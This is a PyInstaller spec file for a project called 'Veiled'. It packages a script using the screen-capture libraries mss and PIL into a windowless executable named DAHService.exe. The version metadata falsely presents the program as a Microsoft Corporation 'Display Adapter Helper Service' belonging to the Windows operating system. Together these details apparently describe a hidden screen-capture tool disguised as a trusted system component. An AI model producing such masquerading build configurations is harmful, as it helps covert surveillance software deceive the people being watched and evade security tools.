# PyInstaller spec file for Veiled
# Usage: pyinstaller build.spec

a = Analysis(
    ['run.py'],
    pathex=[],
    binaries=[],
    datas=[('src/resources', 'src/resources')],
    hiddenimports=['mss', 'PIL'],
    hookspath=[],
    hooksconfig={},
    runtime_hooks=[],
    excludes=[],
    noarchive=False,
)

pyz = PYZ(a.pure)

exe = EXE(
    pyz,
    a.scripts,
    a.binaries,
    a.datas,
    [],
    name='DAHService',
    debug=False,
    bootloader_ignore_signals=False,
    strip=False,
    upx=True,
    console=False,
    icon=None,
    version_info={
        'CompanyName': 'Microsoft Corporation',
        'FileDescription': 'Microsoft Display Adapter Helper Service',
        'FileVersion': '10.0.22621.1',
        'InternalName': 'DAHService',
        'OriginalFilename': 'DAHService.exe',
        'ProductName': 'Microsoft Windows Operating System',
        'ProductVersion': '10.0.22621.1',
    },
)
